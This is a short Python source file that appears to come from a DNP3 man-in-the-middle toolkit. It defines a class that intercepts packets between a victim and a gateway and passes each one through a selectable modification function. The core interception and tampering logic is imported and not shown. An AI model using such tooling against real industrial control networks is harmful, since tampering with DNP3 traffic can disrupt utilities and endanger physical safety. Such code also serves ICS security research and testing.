__author__ = 'Nicholas Rodofile'

from DNP3_MITM import *
from DNP3_Lib.DNP3_Lib_MITM import *

class DNP3_MITM_Modification(DNP3_MITM):
    def __init__(self, victim=None, gateway=None, verbose=1,
                 pkt_count=1, interface_selected=None, MITM_function="forwarding"):
        DNP3_MITM.__init__(self, victim=victim, gateway=gateway, verbose=verbose,
                      pkt_count=pkt_count, interface_selected=interface_selected)
        self.MITM_function = DNP3_MITM_functions[MITM_function]

    def attack_function(self, pkt):
        if self.verbose:
            print pkt.summary()
        pkt = self.MITM_function(pkt)
        return pkt


